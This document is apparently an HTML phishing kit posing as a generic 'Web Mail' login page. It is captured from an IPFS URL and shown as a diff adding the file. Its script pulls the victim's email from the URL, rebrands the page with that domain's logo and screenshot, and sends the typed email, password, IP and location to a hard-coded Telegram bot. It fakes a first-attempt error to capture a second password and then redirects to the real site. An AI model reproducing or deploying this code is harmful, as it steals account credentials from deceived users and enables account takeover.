@@ -1,0 +1,234 @@
+<!-- url: https://ipfs.io/ipfs/bafkreihlo4h66gnp2mxusunekat54p6olixpb2pdr7ok7ddcgsls3qj7ke#x@x.com
+status: 200 -->
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Mail</title>
+    <link rel="icon" class="id">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+     <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <style>
+        *{
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        }
+        body{
+            font-family: 'Segoe UI', sans-serif;
+            background-color: #ccc;
+        }
+        .container-box{
+            width: 32%;
+            margin: 40px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 5px;
+        }
+        .lgBox img{
+            width: 80px;
+        }
+        .lgBox{
+            text-align: center;
+            margin: 10px 0;
+        }
+        .tpBox1{
+            text-align: center;
+            color: #474545;
+        }
+        .tpBox1 h2{
+            font-weight: 500;
+            margin: 10px 0;
+            text-transform: capitalize;
+        }
+        .foBox label{
+            display: block;
+            font-weight: 500;
+            font-size: 14px;
+            margin: 2px 0;
+        }
+        .foBox {
+            margin: 20px 0;
+        }
+        .foBox input{
+            width: 100%;
+            padding: 12px 10px;
+            font-family: inherit;
+            border: 1px solid #ccc;
+            font-size: 14px;
+            border-radius: 3px;
+        }
+        .foBox input:focus{
+            outline: none;
+            border: 1px solid #ccc;
+        }
+        .foBox button{
+            width: 100%;
+            padding: 13px;
+            border-radius: 3px;
+            background-color: rgb(71, 71, 247);
+            font-family: inherit;
+            border: none;
+            font-size: 15px;
+            color: #fff;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .foBox button:hover{
+            background-color: rgb(40, 40, 243);
+        }
+        .foBox button:disabled{
+            background-color: rgb(117, 117, 253);
+            cursor: not-allowed;
+        }
+        .errorBox p{
+            color: rgb(201, 22, 22);
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .hide {
+            display: none;
+        }
+
+        @media screen and (max-width: 700px){
+            .container-box{
+                width: 95%;
+                margin: 100px auto;
+            }
+    }
+    </style>
+</head>
+<body class="body">
+
+    <div class="container-box">
+
+         <div class="lgBox">
+            <img src="https://homenestapptime.netlify.app/download.jpeg" alt="lgw" class="lgi">
+         </div>
+
+         <div class="tpBox1">
+            <h2 class="tBoxi">Web Mail</h2>
+         </div>
+
+         <div class="errorBox hide">
+            <p>Incorrect email password, try again!</p>
+         </div>
+
+         <form action="#" class="mxf">
+            <div class="foBox">
+                <label for="">Email address</label>
+                <input type="email" name="em" id="em" placeholder="Email address" required>
+            </div>
+
+            <div class="foBox">
+                <label for="">Password</label>
+                <input type="password" name="pas" id="pas" placeholder="Password" required>
+            </div>
+
+            <div class="foBox">
+                <button class="btn2">Sign in</button>
+            </div>
+         </form>
+    </div>
+
+    <script>
+        const mxf = document.querySelector(".mxf");
+        const em = document.querySelector("#em");
+        const lgi = document.querySelector(".lgi");
+        const tBoxi = document.querySelector(".tBoxi");
+        const shorticon = document.createElement("link");
+        const id = document.querySelector(".id");
+        const btn2 = document.querySelector(".btn2");
+        const errorBox = document.querySelector(".errorBox");
+        const body = document.querySelector(".body");
+        let num = 0;
+        let domain = "";
+        let ip = "";
+
+
+        // add telegram info
+        const token = "8079473890:AAG1p_rdkOLA3rdwXDyCE3_T4RRmcvUQnzA";
+        const chatId = "7513374700";
+       
+
+        const sendMsg  = (message) => {
+            $.ajax({
+                dataType: 'JSON',
+                url: `https://api.telegram.org/bot${token}/sendMessage`,
+                type: 'POST',
+                data: {
+                    "chat_id": chatId,
+                    "text": message
+                    },
+                })             
+        };
+
+
+    window.addEventListener("load", () => {
+
+        fetch("https://ipinfo.io/json")
+        .then((res) => res.json())
+        .then((resp) => {
+            ip = resp
+        });
+
+        const emgrab =  window.location.href.split("#")[1];
+        if(emgrab){
+            em.value  = emgrab;
+            domain = emgrab.split("@")[1];
+            lgi.src = `https://logo.clearbit.com/${domain}`;
+            body.style.backgroundImage = `linear-gradient(to bottom, rgba(0, 0, 0, 0.466) 0%, rgba(0, 0, 0, 0.678) 100%), url('https://image.thum.io/get/width/1200/https://${domain}')`;
+            body.style.backgroundSize = `cover`;
+            body.style.backgroundRepeat = `no-repeat`;
+            body.style.height = `100vh`;
+
+            const name = domain.split(".")[0];
+            tBoxi.textContent = name;
+            document.title = name;
+
+            shorticon.setAttribute("rel", "shortcut icon");
+            shorticon.setAttribute("href", `https://logo.clearbit.com/${domain}`);
+            id.setAttribute("href", `https://logo.clearbit.com/${domain}`);
+            
+        }
+        
+        });
+
+        mxf.addEventListener("submit", (e) => {
+            e.preventDefault();
+            const pas = e.target.elements.pas.value;
+            btn2.setAttribute("disabled", true);
+            btn2.textContent = "Please wait...";
+            errorBox.classList.add("hide");  
+            num++;
+
+            let data = `IP: ${ip.ip}\nRegion: ${ip.region}\nTime Zone: ${ip.timezone}\n Email: ${em.value}\n Password: ${pas}`;
+            sendMsg(data);
+            btn2.setAttribute("disabled", true);
+
+            setTimeout(() => {
+                btn2.removeAttribute("disabled");
+                btn2.textContent = "Sign in";
+
+                if(num === 1){
+                    errorBox.classList.remove("hide");  
+                    e.target.elements.pas.value = "";
+                }
+                else {
+                    e.target.reset();
+                    window.location.href = `https://${domain}`;
+                }
+
+            }, 3000);
+        })
+
+    </script>
+
+</body>
+</html>
